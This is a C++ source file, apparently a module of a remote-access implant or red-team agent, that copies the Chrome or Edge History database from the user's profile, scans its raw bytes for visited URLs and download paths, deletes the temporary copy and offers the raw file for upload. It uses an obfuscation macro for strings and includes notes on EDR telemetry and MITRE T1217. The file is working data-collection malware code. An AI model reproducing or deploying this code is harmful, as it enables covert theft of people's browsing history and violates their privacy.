#include "BrowserHistory.h"

// ── Helper: copy Chrome or Edge History database to a temp file ────────────────

static std::string CopyHistoryDb() {
    char localApp[MAX_PATH] = {};
    if (!GetEnvironmentVariableA(S("LOCALAPPDATA").c_str(), localApp, MAX_PATH)) return "";

    char tmpPath[MAX_PATH] = {};
    GetTempPathA(MAX_PATH, tmpPath);
    std::string dst = std::string(tmpPath) + S("hist_copy");

    // Chrome path
    std::string src = std::string(localApp) +
        S("\\Google\\Chrome\\User Data\\Default\\History");
    if (CopyFileA(src.c_str(), dst.c_str(), FALSE)) return dst;

    // Edge path
    src = std::string(localApp) +
        S("\\Microsoft\\Edge\\User Data\\Default\\History");
    if (CopyFileA(src.c_str(), dst.c_str(), FALSE)) return dst;

    return "";
}

static std::vector<BYTE> ReadDb(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f.is_open()) return {};
    return std::vector<BYTE>((std::istreambuf_iterator<char>(f)),
                              std::istreambuf_iterator<char>());
}

// ── URL history scan ───────────────────────────────────────────────────────────
// Detection: non-browser process CopyFile on the locked History SQLite (Chrome may
// refuse if running; the copy still triggers file-access telemetry from EDR hooks).
// MITRE T1217 — Browser Information Discovery.

std::string BrowserHistory::Urls(int maxRows) {
    std::string tmp = CopyHistoryDb();
    if (tmp.empty())
        return "browserhistory urls: History database not found "
               "(Chrome/Edge not installed, or no user profile yet)";

    auto db = ReadDb(tmp);
    DeleteFileA(tmp.c_str());
    if (db.empty()) return "browserhistory urls: could not read History copy";

    // Scan for "http" byte sequences inline in SQLite B-tree pages.
    // Chrome stores URL text as UTF-8, so a naive substring scan works well
    // for the vast majority of ASCII-domain URLs.
    std::string out = "Chrome/Edge URLs (up to " + std::to_string(maxRows) + "):\n";
    int found = 0;

    for (size_t i = 0; i + 4 < db.size() && found < maxRows; ++i) {
        if (db[i]=='h' && db[i+1]=='t' && db[i+2]=='t' && db[i+3]=='p') {
            std::string url;
            for (size_t j = i; j < db.size() && j < i + 2048; ++j) {
                unsigned char c = db[j];
                if (c >= 0x20 && c < 0x7F) url += (char)c;
                else break;
            }
            if (url.size() >= 12 && url.size() < 1024) {
                out += "  " + url + "\n";
                ++found;
                i += url.size();
            }
        }
    }

    if (!found) return "browserhistory urls: no URLs found in raw scan "
                       "(use browserhistory db to upload raw file)";
    return out + "\n" + std::to_string(found) + " URL(s) extracted";
}

// ── Download paths scan ────────────────────────────────────────────────────────

std::string BrowserHistory::Downloads(int maxRows) {
    std::string tmp = CopyHistoryDb();
    if (tmp.empty())
        return "browserhistory downloads: History database not found";

    auto db = ReadDb(tmp);
    DeleteFileA(tmp.c_str());
    if (db.empty()) return "browserhistory downloads: could not read History copy";

    std::string out = "Chrome/Edge Downloads (up to " + std::to_string(maxRows) + "):\n";
    int found = 0;

    for (size_t i = 0; i + 3 < db.size() && found < maxRows; ++i) {
        unsigned char c0 = db[i];
        // Drive letter followed by ":\", e.g. C:\Users\...
        if (c0 >= 'C' && c0 <= 'Z' && db[i+1] == ':' && db[i+2] == '\\') {
            std::string path;
            for (size_t j = i; j < db.size() && j < i + 512; ++j) {
                unsigned char c = db[j];
                if (c >= 0x20 && c < 0x7F) path += (char)c;
                else break;
            }
            if (path.size() > 5 && path.size() < 300) {
                out += "  " + path + "\n";
                ++found;
                i += path.size();
            }
        }
    }

    if (!found) return "browserhistory downloads: no local paths found";
    return out + "\n" + std::to_string(found) + " download path(s) extracted";
}

// ── Raw DB export ──────────────────────────────────────────────────────────────

std::string BrowserHistory::HistoryDbPath() {
    return CopyHistoryDb();
}
